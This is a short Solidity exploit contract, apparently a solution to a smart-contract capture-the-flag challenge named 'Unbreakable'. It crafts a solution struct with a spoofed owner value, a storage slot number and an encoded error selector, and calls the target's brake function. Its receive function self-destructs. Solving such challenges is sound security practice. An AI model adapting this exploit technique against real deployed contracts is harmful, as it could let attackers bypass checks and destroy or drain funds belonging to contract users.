// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

import "./Unbreakable.sol";
import "hardhat/console.sol";

contract Exploit {
    Unbreakable instance;

    constructor(Unbreakable _instance) payable {
        instance = _instance;
    }

    function finalize() external {
        // bytes memory errorData = abi.encodeWithSelector(
        //     Unbreakable.Panic.selector,
        //     1
        // );

        bytes memory data = abi.encodeWithSelector(
            Unbreakable.Error.selector,
            ""
        );

        console.logBytes32(
            bytes32(uint256(uint160(address(instance.owner()))))
        );

        console.logBytes(data);

        Unbreakable.Solution memory solution = Unbreakable.Solution({
            ch1_slot: 6,
            ch1_value: bytes32(uint256(uint160(address(instance.owner())))),
            ch2_amount: 1,
            ch2_error: string(data),
            reward: bytes("")
        });

        // bytes memory rewardData = abi.encodeWithSelector(
        //     Unbreakable.solveChallenge.selector,
        //     solution
        // );

        // solution.reward = rewardData;

        instance.brake(solution);
    }

    receive() external payable {
        selfdestruct(payable(address(0)));
    }
}
